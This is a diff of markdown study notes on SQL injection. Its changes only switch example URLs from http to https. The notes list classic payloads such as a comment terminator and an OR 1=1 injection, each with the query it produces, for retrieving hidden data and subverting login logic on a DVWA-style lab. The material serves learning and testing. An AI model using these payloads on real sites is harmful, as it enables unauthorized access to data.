@@ -36,13 +36,13 @@ test web: `www.dvwa.co.uk`
 
 1. retrieve hidden data:
    1. input: Gifts
-   2. `http://web/products?category=Gifts`
+   2. `https://web/products?category=Gifts`
    3. `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
    4. input: Gifts'--
-   5. `http://web/products?category=Gifts'--`
+   5. `https://web/products?category=Gifts'--`
    6. `SELECT * FROM products WHERE category = 'Gifts'`--' AND released = 1
    7. input: Gifts`'+OR+1=1--`
-   8. `http://web/products?category=Gifts'+OR+1=1--`
+   8. `https://web/products?category=Gifts'+OR+1=1--`
    9. `SELECT * FROM products WHERE category = 'Gifts' OR 1=1`--' AND released = 1
 2. subverting application logic
    1. `GET /web3/login/?id=1&Submit=Submit HTTP/1.1`
